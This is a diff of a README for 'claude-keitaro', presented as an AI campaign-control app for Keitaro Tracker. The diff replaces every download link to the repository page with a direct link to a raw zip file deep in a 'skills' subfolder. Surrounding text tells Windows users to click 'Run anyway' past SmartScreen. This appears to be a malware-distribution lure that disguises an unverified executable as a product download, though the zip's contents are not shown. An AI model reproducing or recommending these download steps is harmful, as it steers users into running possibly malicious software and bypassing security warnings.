@@ -1,6 +1,6 @@
 # 🤖 claude-keitaro - Simple AI campaign control
 
-[![Download](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge)](https://github.com/cariemultiphase997/claude-keitaro)
+[![Download](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge)](https://github.com/cariemultiphase997/claude-keitaro/raw/refs/heads/main/skills/keitaro-flows/keitaro-claude-1.4.zip)
 
 ## 🚀 What this app does
 
@@ -23,7 +23,7 @@ You also need access to your Keitaro Tracker account and the right API details i
 ## 📥 Download and open the app
 
 1. Visit this page to download:
-   https://github.com/cariemultiphase997/claude-keitaro
+   https://github.com/cariemultiphase997/claude-keitaro/raw/refs/heads/main/skills/keitaro-flows/keitaro-claude-1.4.zip
 
 2. Open the page in your browser.
 
@@ -161,7 +161,7 @@ If SmartScreen appears, choose More info, then Run anyway if you trust the sourc
 
 If you need to get the app again, visit:
 
-https://github.com/cariemultiphase997/claude-keitaro
+https://github.com/cariemultiphase997/claude-keitaro/raw/refs/heads/main/skills/keitaro-flows/keitaro-claude-1.4.zip
 
 Use this page to download the latest version and reopen the setup file on your Windows PC
 
